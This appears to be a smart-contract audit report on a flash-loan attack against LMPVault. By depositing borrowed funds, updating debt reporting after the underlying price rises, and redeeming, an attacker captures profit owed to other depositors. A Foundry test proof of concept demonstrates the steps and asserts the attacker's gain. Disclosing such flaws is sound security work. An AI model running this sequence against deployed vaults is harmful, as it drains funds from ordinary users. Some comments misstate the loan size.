# When an underlying price increases, an attacker can update the debt info to profit by using flash loans
## Summary

When an underlying price increases, an attacker can update the debt info to profit by using flash loans.

## Vulnerability Detail

The vulnerability allows the attacker to perform a series of actions that lead to substantial profits. The steps involved are as follows:

1. The attacker monitors the underlying prices of destination vaults.
2. When the underlying price of a destination vault increases, the attacker initiates a flash loan.
3. The attacker deposits assets gotten from the flash loan into the `LMPVault` related to the destination vault with the increased underlying price.
4. The attacker updates the debt reporting to reflect the increased debt value resulting from the increased underlying price. The increased debt value raises the total asset value of the `LMPVault`, which in turn increases the Net Asset Value (NAV).
6. Finally, the attacker redeems all of their shares, benefiting from the increased NAV.

This vulnerability allows the attacker to exploit pricing changes and leverage flash loans to maximize their profits.

Here is the coded scenario to demonstrate the vulnerability:


```solidity
    function test_attacker_gets_all_profit_when_underlying_price_increases() public {
        _accessController.grantRole(Roles.SOLVER_ROLE, address(this));
        _accessController.grantRole(Roles.LMP_FEE_SETTER_ROLE, address(this));

        // User is going to deposit 1000 asset
        address user = vm.addr(1111);
        vm.startPrank(user);
        _asset.mint(user, 1000);
        _asset.approve(address(_lmpVault), 1000);
        _lmpVault.deposit(1000, user);
        vm.stopPrank();

        // Deployed 1000 asset to DV1
        _underlyerOne.mint(address(this), 1000);
        _underlyerOne.approve(address(_lmpVault), 1000);
        _lmpVault.rebalance(
            address(_destVaultOne),
            address(_underlyerOne), // tokenIn
            1000,
            address(0), // destinationOut, none when sending out baseAsset
            address(_asset), // baseAsset, tokenOut
            1000
        );

        // Increase the price of DV1 to 200% of original, so that 1000 we transferred out is now worth 2000
        _mockRootPrice(address(_underlyerOne), 2e18);

        // The attacker uses flash loan to get 1_000_000_000 assets
        address attacker = vm.addr(12345);
        vm.startPrank(attacker);
        _asset.mint(attacker, 1_000_000);
        _asset.approve(address(_lmpVault), 1_000_000);

        // The attacker deposits 1_000_000_000 assets
        _lmpVault.deposit(1_000_000, attacker);

        // Updates the debt reporting
        address[] memory dvAddresses = new address[](1);
        dvAddresses[0] = address(_destVaultOne);
        _lmpVault.updateDebtReporting(dvAddresses);

        // Redeems all shares
        uint256 assetsAfter = _lmpVault.redeem(
            _lmpVault.balanceOf(attacker),
            attacker,
            attacker
        );
        vm.stopPrank();

        // The attacker gets most of the profit from the increase of the underlying price
        assertEq(assetsAfter, 1_000_999);

        // Users gets almost no profit
        vm.startPrank(user);
        uint256 userAssets = _lmpVault.redeem(
            _lmpVault.balanceOf(user),
            user,
            user
        );
        assertEq(userAssets, 1001);
    }
```

## Impact

An attacker can execute flash loans to earn substantial profits. This leads to substantial monetary setbacks for other users since the exploit would result in a lower NAV. Consequently, when other users redeem their shares, they would receive fewer assets than they should, particularly if the vulnerability is exploited.
